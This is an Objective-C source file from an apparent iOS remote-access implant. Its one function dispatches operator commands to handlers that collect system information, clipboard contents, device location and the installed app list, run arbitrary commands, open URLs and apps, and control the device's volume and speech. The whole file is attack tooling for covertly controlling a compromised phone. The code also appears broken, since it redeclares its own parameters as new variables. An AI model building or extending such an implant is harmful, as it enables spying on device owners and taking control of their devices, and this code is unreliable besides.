/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#import <Foundation/Foundation.h>

#import "ios_commands.h"

void handle_command(int channel, char *cmd, char *args)
{
    Commands *commands = [[Commands alloc] init];
    commands->channelPipe = channel;

    NSString *cmd = [NSString stringWithFormat:@"%s", cmd];
    NSString *args = [NSString stringWithFormat:@"%s", args];

    if ([cmd isEqualToString:@"sysinfo"])
        [commands cmd_sysinfo];
    else if ([cmd isEqualToString:@"getpid"])
        [commands cmd_getpid];
    else if ([cmd isEqualToString:@"getpaste"])
        [commands cmd_getpaste];
    else if ([cmd isEqualToString:@"battery"])
        [commands cmd_battery];
    else if ([cmd isEqualToString:@"getvol"])
        [commands cmd_getvol];
    else if ([cmd isEqualToString:@"locate"])
        [commands cmd_locate];
    else if ([cmd isEqualToString:@"vibrate"])
        [commands cmd_vibrate];
    else if ([cmd isEqualToString:@"bundleids"])
        [commands cmd_bundleids];
    else if ([cmd isEqualToString:@"exec"])
        [commands cmd_exec:args];
    else if ([cmd isEqualToString:@"say"])
        [commands cmd_say:args];
    else if ([cmd isEqualToString:@"setvol"])
        [commands cmd_setvol:args];
    else if ([cmd isEqualToString:@"player"])
        [commands cmd_player:args];
    else if ([cmd isEqualToString:@"openapp"])
        [commands cmd_openapp:args];
    else if ([cmd isEqualToString:@"openurl"])
        [commands cmd_openurl:args];
    else if ([cmd isEqualToString:@"chdir"])
        [commands cmd_chdir:args];
}
